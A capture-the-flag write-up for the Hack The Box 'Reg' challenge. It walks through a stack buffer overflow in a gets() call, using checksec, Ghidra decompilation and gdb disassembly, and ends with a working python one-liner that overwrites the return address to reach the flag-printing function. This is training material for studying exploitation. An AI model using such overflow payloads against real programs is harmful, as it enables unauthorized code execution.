# Reg Write-up

Love buffer overflow practices. Lets get started

```shell
╰─ file reg                                                                           ─╯
reg: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=134349a67c90466b7ce51c67c21834272e92bdbf, for GNU/Linux 3.2.0, not stripped

╰─ gdb -q ./reg                                                                       ─╯
Reading symbols from ./reg...
(No debugging symbols found in ./reg)
gdb-peda$ checksec
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$
```

Get information with ghidra, found main function wich calls run function:

```code
undefined8 main(void)

{
  run();
  return 0;
}
```

run function has locat_38 48 char var and gets, gets function is bufferoverflow exposed.

```code
void run(void)

{
  char local_38 [48];
  
  initialize();
  printf("Enter your name : ");
  gets(local_38);
  puts("Registered!");
  return;
}
```
this function is not called on the code, so we never get it. The plan is use the gets buffer overflow, and pass return address from winner function after the offset. 

```code
void winner(void)

{
  char local_418 [1032];
  FILE *local_10;
  
  puts("Congratulations!");
  local_10 = fopen("flag.txt","r");
  fgets(local_418,0x400,local_10);
  puts(local_418);
  fclose(local_10);
  return;
}

```

Lets get adress memory from winner function, exactly 0x0000000000401207 where rbp is moved to rps:


```code
gdb-peda$ disassemble winner
Dump of assembler code for function winner:
   0x0000000000401206 <+0>:	push   rbp
   0x0000000000401207 <+1>:	mov    rbp,rsp
   0x000000000040120a <+4>:	sub    rsp,0x410
   0x0000000000401211 <+11>:	lea    rdi,[rip+0xdec]        # 0x402004
   0x0000000000401218 <+18>:	call   0x401030 <puts@plt>
   0x000000000040121d <+23>:	lea    rsi,[rip+0xdf1]        # 0x402015
   0x0000000000401224 <+30>:	lea    rdi,[rip+0xdec]        # 0x402017
   0x000000000040122b <+37>:	call   0x4010a0 <fopen@plt>
   0x0000000000401230 <+42>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401234 <+46>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401238 <+50>:	lea    rax,[rbp-0x410]
   0x000000000040123f <+57>:	mov    esi,0x400
   0x0000000000401244 <+62>:	mov    rdi,rax
   0x0000000000401247 <+65>:	call   0x401070 <fgets@plt>
   0x000000000040124c <+70>:	lea    rax,[rbp-0x410]
   0x0000000000401253 <+77>:	mov    rdi,rax
   0x0000000000401256 <+80>:	call   0x401030 <puts@plt>
   0x000000000040125b <+85>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040125f <+89>:	mov    rdi,rax
   0x0000000000401262 <+92>:	call   0x401040 <fclose@plt>
   0x0000000000401267 <+97>:	nop
   0x0000000000401268 <+98>:	leave
   0x0000000000401269 <+99>:	ret
End of assembler dump.
```

In this case we want to let it easy in order to get the basic concepts.

gets function is put it onside char local_38 [48]; try overflow with python string until we get offset:

Create flag file:
```shell
echo "GETSSSSSSS" > flag.txt 
```

Search manual offset with python:
```shell
 …  hackthebox  Reg  Files  python -c 'print("A"*60)' |./reg     SIGINT   main
Enter your name : Registered!
Segmentation fault (core dumped)
 …  hackthebox  Reg  Files  python -c 'print("A"*50)' |./reg   SIGSEGV   main 
Enter your name : Registered!
 …  hackthebox  Reg  Files  python -c 'print("A"*55)' |./reg              main 
Enter your name : Registered!
 …  hackthebox  Reg  Files  python -c 'print("A"*59)' |./reg              main 
Enter your name : Registered!
Segmentation fault (core dumped)
 …  hackthebox  Reg  Files  python -c 'print("A"*56)' |./reg   SIGSEGV   main 
Enter your name : Registered!
Illegal instruction (core dumped)
 …  hackthebox  Reg  Files  python -c 'print("A"*55)' |./reg 0  SIGILL   main 
Enter your name : Registered!
 …  hackthebox  Reg  Files  python -c 'print("A"*56)' |./reg              main 
Enter your name : Registered!
Illegal instruction (core dumped)
 …  hackthebox  Reg  Files             

```

Look at this, on 55 A string generated with python, no segment fault happen but It just happend on 56, so offset is 56.

We have offset (56) and address we want as return 0x0000000000401207 = \x07\x12\x40\x00, lets concatenate this two values with python and pipe to reg file:

```shell
python -c 'print("A"*56 + "\x07\x12\x40\x00")'|./reg Enter your name : Registered!Congratulations!
GETSSSSSSS
```

GREAT!
